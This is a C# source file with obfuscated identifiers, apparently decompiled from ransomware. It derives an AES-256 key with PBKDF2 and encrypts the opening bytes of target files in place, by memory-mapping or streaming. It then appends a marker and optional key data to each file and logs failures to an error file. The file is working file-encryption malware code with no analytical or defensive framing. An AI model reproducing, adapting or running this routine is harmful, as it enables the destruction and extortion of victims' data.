using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;

namespace kuMeqwHpurUBOD;

public static class luIgktEtlHVR
{
	public static byte[] ZnyJbIPDofh(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = IzsXTyMzuH(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes IzsXTyMzuH(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] sjLnWbxhrKF(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (BErRpdYOfQAwSr.KGlWteEpKYfz == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
			{
				try
				{
					File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + string_0 + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void SEcBXBtSwKeqJ(string YrxPFTOslcV, byte[] DWszvBlRCViF, byte[] KIcXskzpJWslXMph = null)
	{
		try
		{
			byte[] array = null;
			if (BErRpdYOfQAwSr.KGlWteEpKYfz == "YES")
			{
				array = (BErRpdYOfQAwSr.txjxRPsHuzRR ? Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==")) : Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(YrxPFTOslcV, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(DWszvBlRCViF, 0, DWszvBlRCViF.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(YrxPFTOslcV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(KIcXskzpJWslXMph, 0, KIcXskzpJWslXMph.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (BErRpdYOfQAwSr.txjxRPsHuzRR ? Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==")) : Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==")));
			FileStream fileStream2 = new FileStream(YrxPFTOslcV, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(DWszvBlRCViF, 0, DWszvBlRCViF.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(YrxPFTOslcV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(KIcXskzpJWslXMph, 0, KIcXskzpJWslXMph.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
			{
				try
				{
					File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + YrxPFTOslcV + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (BErRpdYOfQAwSr.txjxRPsHuzRR ? Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Kw==")) : Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.RWvNPbkGfQ) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==") + Convert.ToString(BErRpdYOfQAwSr.XZspBinZvbc) + BErRpdYOfQAwSr.oMKRHTBqYRfOk("LQ==")));
			FileStream fileStream4 = new FileStream(YrxPFTOslcV, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(DWszvBlRCViF, 0, DWszvBlRCViF.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(YrxPFTOslcV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!BErRpdYOfQAwSr.txjxRPsHuzRR)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(KIcXskzpJWslXMph, 0, KIcXskzpJWslXMph.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}
}
